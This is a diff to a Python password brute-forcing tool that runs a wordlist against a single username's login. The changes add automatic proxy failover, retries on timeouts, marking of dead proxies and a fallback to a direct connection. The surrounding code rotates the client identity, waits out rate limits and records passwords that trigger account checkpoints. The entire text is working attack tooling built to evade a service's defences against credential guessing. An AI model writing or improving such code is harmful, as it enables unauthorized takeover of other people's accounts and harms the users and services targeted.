@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-"""Brute — live progress + current password."""
+"""Brute — live progress + auto proxy failover."""
 
 import json
 import os
@@ -29,7 +29,10 @@ class BruteEngine:
         self.output_dir = output_dir
         self.delay_min = float(delay_min)
         self.delay_max = float(delay_max)
-        self.proxy_mgr = ProxyManager(proxy_file=proxy_file, proxy_url=proxy)
+        self.proxy_mgr = ProxyManager(
+            proxy_file=proxy_file,
+            proxy_url=proxy,
+        )
         if self.proxy_mgr.count:
             info("Validating proxies...")
             self.proxy_mgr.validate_all()
@@ -52,7 +55,10 @@ class BruteEngine:
                 d = json.load(f)
             self._tried = set(d.get("tried", []))
             self._cursor = int(d.get("cursor", 0))
-            info(f"Resume cursor={self._cursor} tried={len(self._tried)}")
+            info(
+                f"Resume cursor={self._cursor} "
+                f"tried={len(self._tried)}"
+            )
         except Exception:
             pass
 
@@ -82,11 +88,16 @@ class BruteEngine:
         bar_len = 18
         filled = int(bar_len * i / total) if total else 0
         bar = "█" * filled + "░" * (bar_len - filled)
-        pw = password if len(password) <= 26 else password[:23] + "..."
+        pw = (
+            password
+            if len(password) <= 26
+            else password[:23] + "..."
+        )
         line = (
             f"\r{C.C}[{i}/{total}]{C.E} "
             f"{C.G}{bar}{C.E} "
-            f"{pct:5.1f}% | {rate:4.2f}/s | ETA {eta_s} | "
+            f"{pct:5.1f}% | {rate:4.2f}/s | "
+            f"ETA {eta_s} | "
             f"pwd: {C.Y}{pw}{C.E}{extra}   "
         )
         sys.stdout.write(line)
@@ -127,53 +138,89 @@ class BruteEngine:
             for password in passwords:
                 if self._found:
                     break
+
                 self._cursor += 1
                 done += 1
                 self._tried.add(password)
 
                 purl = self.proxy_mgr.get_next()
-                self.api.set_proxy(purl if purl else None)
 
-                if done % 7 == 0:
-                    self.api._rotate_identity()
+                max_retries = 3
+                for attempt in range(max_retries):
+                    self.api.set_proxy(purl if purl else None)
 
-                result = self.api.try_login(self.username, password)
-                extra = ""
+                    if done % 5 == 0 or attempt > 0:
+                        self.api._rotate_identity()
 
-                if result.get("success"):
-                    self._found = password
-                    print()
-                    ok(f"FOUND → {password}")
+                    result = self.api.try_login(self.username, password)
+                    extra = ""
+
+                    if result.get("success"):
+                        self._found = password
+                        print()
+                        ok(f"FOUND → {password}")
+                        break
+
+                    st = result.get("status", "")
+
+                    if st in ("timeout", "connection_error"):
+                        if purl:
+                            self.proxy_mgr.mark_dead(purl)
+                            warn(f"Proxy dead: {purl}")
+                        purl = self.proxy_mgr.get_next()
+                        if purl and attempt < max_retries - 1:
+                            extra = f" | retry {attempt+2}/{max_retries}"
+                            self._progress(
+                                done, total, password, start, extra
+                            )
+                            time.sleep(random.uniform(1, 2))
+                            continue
+                        else:
+                            extra = " | all proxies dead — DIRECT"
+                            self.api.set_proxy(None)
+                            result = self.api.try_login(
+                                self.username, password
+                            )
+                            st = result.get("status", "")
+                            break
+
+                    if st == "checkpoint":
+                        self._checkpoints.append(password)
+                        try:
+                            with open(
+                                self.checkpoint_file, "a", encoding="utf-8"
+                            ) as cf:
+                                cf.write(password + "\n")
+                        except Exception:
+                            pass
+                        extra = f" | {C.Y}CHECKPOINT{C.E}"
+                    elif st == "rate_limited":
+                        extra = f" | {C.R}RATE-LIMIT{C.E}"
+                        self._progress(
+                            done, total, password, start, extra
+                        )
+                        time.sleep(random.uniform(45, 100))
+                    elif st == "invalid_user":
+                        print()
+                        err("Username invalid — stop")
+                        break
+
+                    if purl and st not in ("timeout", "connection_error"):
+                        self.proxy_mgr.mark_alive(purl)
+
                     break
 
-                st = result.get("status", "")
-                if st == "checkpoint":
-                    self._checkpoints.append(password)
-                    try:
-                        with open(
-                            self.checkpoint_file, "a", encoding="utf-8"
-                        ) as cf:
-                            cf.write(password + "\n")
-                    except Exception:
-                        pass
-                    extra = f" | {C.Y}CHECKPOINT{C.E}"
-                elif st == "rate_limited":
-                    extra = f" | {C.R}RATE-LIMIT{C.E}"
-                    self._progress(done, total, password, start, extra)
-                    time.sleep(random.uniform(45, 100))
-                elif st == "invalid_user":
-                    print()
-                    err("Username invalid — stop")
+                else:
+                    extra = " | no proxy worked"
+
+                if result.get("status") == "invalid_user":
                     break
-                elif st in ("timeout", "connection_error"):
-                    extra = f" | {C.R}{st}{C.E}"
-                    if purl:
-                        self.proxy_mgr.mark_dead(purl)
 
                 self._progress(done, total, password, start, extra)
 
                 if done % 20 == 0:
                     self._save()
+                    self.proxy_mgr.show_stats()
 
                 time.sleep(random.uniform(self.delay_min, self.delay_max))
 
@@ -190,6 +237,7 @@ class BruteEngine:
         print(f"  Done @{self.username} | tried {done} | {elapsed:.0f}s")
         print(f"  Found: {self._found or 'none'}")
         print(f"  Checkpoints: {len(self._checkpoints)}")
+        self.proxy_mgr.show_stats()
         print(f"{C.C}{'═' * 48}{C.E}")
 
         if self._found:
